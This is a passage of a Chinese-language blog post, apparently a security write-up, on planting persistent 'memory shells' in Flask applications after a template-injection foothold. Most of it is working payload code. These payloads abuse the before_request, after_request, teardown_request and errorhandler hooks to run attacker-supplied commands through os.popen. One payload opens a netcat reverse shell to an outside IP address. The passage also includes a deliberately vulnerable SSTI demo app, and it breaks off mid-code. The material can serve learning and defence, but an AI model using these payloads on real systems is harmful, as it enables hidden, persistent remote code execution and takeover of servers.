+</span></span><span class=line><span class=cl>    <span class=n>template</span> <span class=o>=</span> <span class=s1>&#39;&lt;h1&gt;Hi, </span><span class=si>%s</span><span class=s1>.&lt;/h1&gt;&#39;</span> <span class=o>%</span> <span class=n>person</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=n>template</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span><span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=装饰器>装饰器</h3><blockquote><p>装饰器是一种用于修改或增强函数或方法行为的高级函数。它可以在不改变原函数代码的前提下，<strong>动态</strong>地给函数添加额外的功能。通常是通过 <code>@decorator_name</code> 语法糖来应用的，可以作用于函数、方法，甚至类。装饰器本质上是一个接受函数作为参数并返回一个新函数的函数。</p></blockquote><h4 id=before_request>before_request()</h4><p>before_request 方法允许我们在每个请求之前执行一些操作。我们可以利用这个方法来进行身份验证、请求参数的预处理等任务。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>before_request</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>f</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Registers a function to run before each request.
+</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>before_request_funcs</span><span class=o>.</span><span class=n>setdefault</span><span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=p>[])</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>f</span>
+</span></span></code></pre></td></tr></table></div></div><p>那么搞到源码之后发现其中起作用的应该就是<code>self.before_request_funcs.setdefault(None, []).append(f)</code>了，一样的逐步分析</p><p><code>self.before_request_funcs</code> 是 Flask 应用对象（<code>Flask</code> 类的实例）中的一个属性。它是一个 <strong>字典</strong>，用于存储在请求处理之前需要执行的钩子函数。</p><p><code>setdefault</code> 是 Python 字典的一个方法，用来获取字典中指定键的值。如果该键存在，返回其对应的值；如果不存在，则插入这个键，并将其值设为指定的默认值。</p><ul><li><strong><code>None</code></strong>: 这是我们要检查或插入的键。对于 <code>before_request_funcs</code> 字典，<code>None</code> 键表示全局应用的 <code>before_request</code> 钩子</li><li><strong><code>[]</code></strong>: 如果 <code>before_request_funcs</code> 字典中不存在键 <code>None</code>，那么 <code>setdefault</code> 会插入这个键，并将其值设为一个空列表 <code>[]</code>。</li></ul><p><code>.append(f)</code> 是对列表进行操作的方法，用来将元素 <code>f</code> 添加到列表的末尾。</p><p>那么此时我们只要把<code>lambda:__import__('os').popen('whoami').read()</code>插入，那不就爽了？</p><p>那么现在获得这个函数</p><p>其在app中，所以我们得到<strong>sys.modules</strong>(可获取所有模块)</p><blockquote><p>sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度</p></blockquote><p><img src=/p/flask-memory-shell-analysis/QQ20240902-164510.png width=1549 height=740 loading=lazy alt=2></p><p>得到之后加<code>payload</code>,一次打入二次回显即可</p><p><img src=/p/flask-memory-shell-analysis/QQ20240902-164658.png width=1891 height=834 loading=lazy alt=3></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>url_for.__globals__.__builtins__[&#39;eval&#39;](&#34;sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs.setdefault(None, []).append(lambda:__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read())&#34;)
+</span></span></code></pre></td></tr></table></div></div><p>但是貌似有个坏处就是只能打一次，打完就得刷新，这也太露骨了吧？！</p><h4 id=after_request>after_request()</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>after_request</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>f</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>after_request_funcs</span><span class=o>.</span><span class=n>setdefault</span><span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=p>[])</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>f</span>
+</span></span></code></pre></td></tr></table></div></div><p>这乍一看一模一样啊(还是有很大区别的)</p><blockquote><p>在视图函数执行完毕并生成响应对象之后调用。即请求已经被处理完成并生成了响应，所有注册的 <code>after_request</code> 函数将对该响应对象进行进一步的处理。</p></blockquote><p>也就是说我们想要打入必须重新构造一个响应(<del>不会了</del>)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(\&#34;global CmdResp;CmdResp=__import__(\&#39;flask\&#39;).make_response(__import__(\&#39;os\&#39;).popen(request.args.get(\&#39;cmd\&#39;)).read())\&#34;)==None else resp)&#34;,{&#39;request&#39;:url_for.__globals__[&#39;request&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]})
+</span></span></code></pre></td></tr></table></div></div><p>不是吧这么长，那我们分析一下拖下来</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>url_for</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>][</span><span class=s1>&#39;eval&#39;</span><span class=p>](</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>    app.after_request_funcs.setdefault(None, []).append(
+</span></span></span><span class=line><span class=cl><span class=s1>        lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(
+</span></span></span><span class=line><span class=cl><span class=s1>            </span><span class=se>\&#34;\&#34;\&#34;</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>            global CmdResp;
+</span></span></span><span class=line><span class=cl><span class=s1>            CmdResp = __import__(&#39;flask&#39;).make_response(
+</span></span></span><span class=line><span class=cl><span class=s1>                __import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()
+</span></span></span><span class=line><span class=cl><span class=s1>            )
+</span></span></span><span class=line><span class=cl><span class=s1>            </span><span class=se>\&#34;\&#34;\&#34;</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>        ) == None else resp
+</span></span></span><span class=line><span class=cl><span class=s1>    )
+</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;request&#39;</span><span class=p>:</span> <span class=n>url_for</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;request&#39;</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;app&#39;</span><span class=p>:</span> <span class=n>url_for</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;current_app&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><blockquote><p>结果1 if 条件 else 结果2</p></blockquote><ul><li><strong>结果1 (<code>CmdResp</code>)</strong>：如果条件为 <code>True</code>，返回 <code>CmdResp</code>。</li><li><strong>条件 (<code>request.args.get('cmd') and exec(...) == None</code>)</strong>：用来决定返回哪个结果。</li><li><strong>结果2 (<code>resp</code>)</strong>：如果条件为 <code>False</code>，返回原始响应 <code>resp</code>。(这里也就是返回<code>bao</code>)</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>CmdResp</span> <span class=o>=</span> <span class=nb>__import__</span><span class=p>(</span><span class=s1>&#39;flask&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>make_response</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>                <span class=nb>__import__</span><span class=p>(</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;cmd&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>用于生成新的响应内容,也就是我们的<code>shell</code></p><p>而且我们知道这个是个恒真式，所以自然而然的就成功了</p><p><img src=/p/flask-memory-shell-analysis/QQ20240902-165541.png width=799 height=750 loading=lazy alt=4></p><p>成功打入</p><h3 id=hook函数>hook函数</h3><blockquote><p>钩子函数是一种设计模式，用于在特定的程序执行点插入自定义代码。这种机制通常由框架或库提供，允许开发者在特定事件发生时挂钩（hook）到这些事件上执行自定义逻辑。钩子函数的典型用法是作为回调函数，在某些预定义的事件或操作发生时自动被调用。</p></blockquote><p>其实上面的装饰器中就已经包含了两种钩子函数了(发现没嘿嘿)</p><h4 id=teardown_request>teardown_request</h4><blockquote><p><code>teardown_request</code> 是在每个请求的最后阶段执行的，即在视图函数处理完成并生成响应后，或者在请求中发生未处理的异常时，都会执行这个钩子。</p><p>它执行的时机是在响应已经确定之后，但在最终发送给客户端之前。</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>teardown_request</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>f</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>teardown_request_funcs</span><span class=o>.</span><span class=n>setdefault</span><span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=p>[])</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>f</span>
+</span></span></code></pre></td></tr></table></div></div><p>但是介于这个函数没有回显所以我们弹<code>shell</code>或者写文件会比较好</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>url_for.__globals__.__builtins__[&#39;eval&#39;](&#34;sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#39;os&#39;).system(&#39;mkfifo /tmp/fifo; /bin/sh -i &lt; /tmp/fifo | nc 106.54.239.23 9999 &gt; /tmp/fifo; rm /tmp/fifo&#39;))&#34;)
+</span></span></code></pre></td></tr></table></div></div><p>反弹成功</p><p><img src=/p/flask-memory-shell-analysis/QQ20240902-175214.png width=610 height=579 loading=lazy alt=5></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#39;os&#39;).popen(&#39;ls &gt; 11.txt&#39;).read())&#34;)
+</span></span></code></pre></td></tr></table></div></div><p>成功打入，访问文件即可</p><p><img src=/p/flask-memory-shell-analysis/QQ20240902-174807.png width=1638 height=893 loading=lazy alt=6></p><p>并且通过测试发现，这个文件的结果还是动态更新的，只要<code>flask</code>实例还在</p><h4 id=errorhandler>errorhandler</h4><blockquote><p>在 Flask 中，<code>errorhandler</code> 是一种机制，用于处理应用程序中发生的错误。当你的 Flask 应用遇到错误（例如 404 页面未找到或 500 服务器内部错误）时，你可以定义自定义的错误处理程序来处理这些错误并返回适当的响应。</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>errorhandler</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>code_or_exception</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>def</span> <span class=nf>decorator</span><span class=p>(</span><span class=n>f</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>_register_error_handler</span><span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=n>code_or_exception</span><span class=p>,</span> <span class=n>f</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>f</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>decorator</span>
+</span></span></code></pre></td></tr></table></div></div><p>看完之后发现调用的是另一个东西</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>_register_error_handler</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>code_or_exception</span><span class=p>,</span> <span class=n>f</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>    Registers an error handler for the given code or exception class.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    :param key: If this handler is specific to a blueprint, this will be the
+</span></span></span><span class=line><span class=cl><span class=s2>        blueprint name. If this handler is for all blueprints, None.
+</span></span></span><span class=line><span class=cl><span class=s2>    :param code_or_exception: The code as an integer, or an exception class.
+</span></span></span><span class=line><span class=cl><span class=s2>    :param f: The handler function.
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>code_or_exception</span><span class=p>,</span> <span class=n>HTTPException</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=n>code_or_exception</span><span class=o>.</span><span class=n>code</span>
+</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>code_or_exception</span><span class=p>,</span> <span class=nb>int</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=n>code_or_exception</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>exc_class</span><span class=p>,</span> <span class=n>code</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_get_exc_class_and_code</span><span class=p>(</span><span class=n>code_or_exception</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>exc_class</span> <span class=ow>not</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>error_handler_spec</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>error_handler_spec</span><span class=p>[</span><span class=n>exc_class</span><span class=p>]</span> <span class=o>=</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>error_handler_spec</span><span class=p>[</span><span class=n>exc_class</span><span class=p>][</span><span class=n>key</span><span class=p>]</span> <span class=o>=</span> <span class=n>f</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># If the handler is for a specific HTTP status code, also store it by</span>
+</span></span><span class=line><span class=cl>    <span class=c1># code in case there are multiple exceptions for the same code.</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>code</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>error_handler_spec</span><span class=p>[</span><span class=n>code</span><span class=p>]</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>error_handler_spec</span><span class=p>[</span><span class=n>exc_class</span><span class=p>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>到了关键了发现<code>exc_class\code</code>都是由<code>_get_exc_class_and_code</code>控制</p><blockquote><p>这个定义的函数 _get_exc_class_and_code 是用来处理异常类或 HTTP 状态码的。函数接受一个参数，exc_class_or_code，可以是一个异常类或者一个 HTTP 状态码（整型）。</p></blockquote><p>来了那我们怎么可控呢，来绕圈圈啦</p><p>被<code>_get_exc_class_and_code</code>获取之后,再通过<code>error_handler_spec</code>进行重新处理</p><p><code>error_handler_spec</code> 是一个字典，主要用于映射不同的错误类型到相应的错误处理函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kc>None</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=n>error_code</span><span class=o>&gt;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=o>&lt;</span><span class=n>exc_class</span><span class=o>&gt;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>error_handler_function</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li><strong><code>None</code></strong>: 这个键表示默认的错误处理程序，如果没有为特定的错误码和异常类定义处理程序，则使用默认处理程序。</li><li><strong><code>&lt;error_code></code></strong>: 错误码（如 404、500 等），用于指定错误类型。</li><li><strong><code>&lt;exc_class></code></strong>: 异常类，用于指定具体的异常。</li><li><strong><code>&lt;error_handler_function></code></strong>: 错误处理函数，当指定的错误码和异常类匹配时，Flask 会调用这个函数来处理错误。</li></ul><p>所以我们直接可控<code>f</code>即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>url_for.__globals__.__builtins__.exec(&#34;global exc_class;global code;exc_class, code = sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;]._get_exc_class_and_code(404);sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;,&#39;whoami&#39;)).read()&#34;)
+</span></span></code></pre></td></tr></table></div></div><p>分析一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>url_for</span><span class=o>.</span><span class=vm>__globals__</span><span class=o>.</span><span class=n>__builtins__</span><span class=o>.</span><span class=n>exec</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>    global exc_class
+</span></span></span><span class=line><span class=cl><span class=s1>    global code
+</span></span></span><span class=line><span class=cl><span class=s1>    exc_class, code=sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;]._get_exc_class_and_code(404)
+</span></span></span><span class=line><span class=cl><span class=s1>    sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].error_handler_spec[None][code][exc_class]=
+</span></span></span><span class=line><span class=cl><span class=s1>    lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;,&#39;whoami&#39;).read())
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>exc_class</span><span class=p>,</span> <span class=n>code</span><span class=o>=</span><span class=n>sys</span><span class=o>.</span><span class=n>modules</span><span class=p>[</span><span class=s1>&#39;__main__&#39;</span><span class=p>]</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;app&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>_get_exc_class_and_code</span><span class=p>(</span><span class=mi>404</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1>#先获取异常类和错误码</span>
+</span></span><span class=line><span class=cl><span class=n>sys</span><span class=o>.</span><span class=n>modules</span><span class=p>[</span><span class=s1>&#39;__main__&#39;</span><span class=p>]</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;app&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>error_handler_spec</span><span class=p>[</span><span class=kc>None</span><span class=p>][</span><span class=n>code</span><span class=p>][</span><span class=n>exc_class</span><span class=p>]</span><span class=o>=</span>
+</span></span><span class=line><span class=cl>    <span class=k>lambda</span> <span class=n>a</span><span class=p>:</span><span class=nb>__import__</span><span class=p>(</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;cmd&#39;</span><span class=p>,</span><span class=s1>&#39;whoami&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=c1>#设置404错误处理函数，也就是我们注入的地方</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>url_for.__globals__.__builtins__.exec(&#34;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;,&#39;whoami&#39;)).read()&#34;,{&#39;request&#39;:url_for.__globals__[&#39;request&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]})
+</span></span></code></pre></td></tr></table></div></div><p>但是你会发现打不通，那是因为服务器的处理问题，此时我们需要一个<code>try</code>来捕捉，也是为了能够确保触发404(现实生活肯定也是能触发404的)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>render_template_string</span><span class=p>,</span> <span class=n>abort</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 主页路由</span>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;Welcome to the SSTI Demo!&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 模板渲染路由，存在SSTI漏洞</span>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/template&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>template</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=c1># 获取用户输入的模板字符串</span>
+</span></span><span class=line><span class=cl>    <span class=n>template_str</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;template&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
